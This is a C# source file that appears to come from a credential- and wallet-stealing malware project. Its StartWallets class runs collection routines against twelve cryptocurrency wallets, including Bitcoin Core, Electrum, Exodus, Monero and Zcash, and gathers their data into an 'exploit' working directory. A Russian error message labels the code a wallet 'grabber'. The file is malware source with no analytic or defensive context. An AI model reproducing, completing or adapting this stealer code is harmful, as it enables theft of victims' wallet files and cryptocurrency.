using System;
using System.Threading;

namespace youknowcaliber
{
    class StartWallets
    {
        public static void Start()
        {
            string WorkDir = Help.ExploitDir;

            try
            {
                Armory.ArmoryStr(WorkDir);
                AtomicWallet.AtomicStr(WorkDir);
                BitcoinCore.BCStr(WorkDir);
                Bytecoin.BCNcoinStr(WorkDir);
                DashCore.DSHcoinStr(WorkDir);
                Electrum.EleStr(WorkDir);
                Ethereum.EcoinStr(WorkDir);
                LitecoinCore.LitecStr(WorkDir);
                Monero.XMRcoinStr(WorkDir);
                Exodus.ExodusStr(WorkDir);
                Zcash.ZecwalletStr(WorkDir);
                Jaxx.JaxxStr(WorkDir);
            }
            catch(Exception e)
            {
                Console.WriteLine(e + "Старт грабера с кошелями дал сбой" );
            }
        }
    }
}
